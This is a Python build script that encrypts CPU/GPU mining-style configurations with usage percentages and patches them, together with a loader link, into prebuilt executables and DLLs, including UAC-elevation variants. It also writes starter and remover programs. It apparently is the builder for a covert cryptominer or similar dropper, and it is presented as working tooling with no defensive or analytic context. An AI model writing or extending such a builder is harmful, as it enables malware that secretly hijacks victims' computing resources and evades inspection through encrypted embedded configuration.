import base64

from encrypt_config import encrypter_aes


def build_main(configs: list[tuple[str, list[str]]]) -> None:
    cpu_string = ""
    gpu_string = ""
    configs = configs[:4]
    print(configs)
    for config in configs:
        cpu_bool = config[0].startswith("CPU")
        if cpu_bool:
            if not cpu_string:
                string_args = " ".join(config[1][1:])
                cpu_string = cpu_string + encrypter_aes(string_args)

            else:
                string_args = " ".join(config[1][1:])
                cpu_string = cpu_string + "," + encrypter_aes(string_args)
                percentage = "50"
                for arg in config[1][1:]:
                    if "percentage=" in arg:
                        percentage = int(arg.replace("%", "").split("=")[1].strip())
                        if percentage < 1:
                            percentage = 1

                        percentage = str(percentage)

                        if len(percentage) == 1:
                            percentage = "0" + percentage
                        elif len(percentage) > 2:
                            percentage = percentage[:2]

                cpu_string = str(100 - int(percentage)) + "$" + cpu_string

            continue

        if not gpu_string:
            string_args = " ".join(config[1][1:])
            gpu_string = gpu_string + encrypter_aes(string_args)

        else:
            string_args = " ".join(config[1][1:])
            gpu_string = gpu_string + "," + encrypter_aes(string_args)
            percentage = "50"
            for arg in config[1][1:]:
                if "percentage=" in arg:
                    percentage = int(arg.replace("%", "").split("=")[1].strip())
                    if percentage < 1:
                        percentage = 1

                    percentage = str(percentage)

                    if len(percentage) == 1:
                        percentage = "0" + percentage
                    elif len(percentage) > 2:
                        percentage = percentage[:2]

            gpu_string = str(100 - int(percentage)) + "$" + gpu_string

    from installer_env import installer_bytes_exe, installer_bytes_dll, installer_bytes_dll_uac, installer_bytes_exe_uac, starter_bytes, remover_bytes
    encoded_args = cpu_string + "|" + gpu_string
    encoded_args = base64.b64encode(encoded_args.encode("utf-8")).decode()
    print(len(encoded_args))
    encoded_args = encoded_args + ("." * (7000 - len(encoded_args)))
    mega_dict = {"main.exe": installer_bytes_exe, "main.dll": installer_bytes_dll,
                 "main_uac.exe": installer_bytes_exe_uac, "main_uac.dll": installer_bytes_dll_uac}
    for key, value in mega_dict.items():
        dots = ("." * 7000).encode("utf-16le")
        position = value.find(dots)
        # print(position)
        # print(encoded_args.strip("."))
        data = (
                value[:position]
                + encoded_args.encode("utf-16le")
                + value[position + len(dots):]
        )

        linker = open("loaderlink.txt", "r", encoding="utf-8").read().strip()
        linker = linker + ("." * (256 - len(linker)))
        print(len(linker))
        dots = ("," + "." * 255).encode("utf-16le")
        position2 = data.find(dots)
        print(position2)
        data = (
                data[:position2]
                + linker.encode("utf-16le")
                + data[position2 + len(dots):]
        )
        open(key, "wb").write(data)



    open("starter.exe", "wb").write(starter_bytes)
    open("remover.exe", "wb").write(remover_bytes)









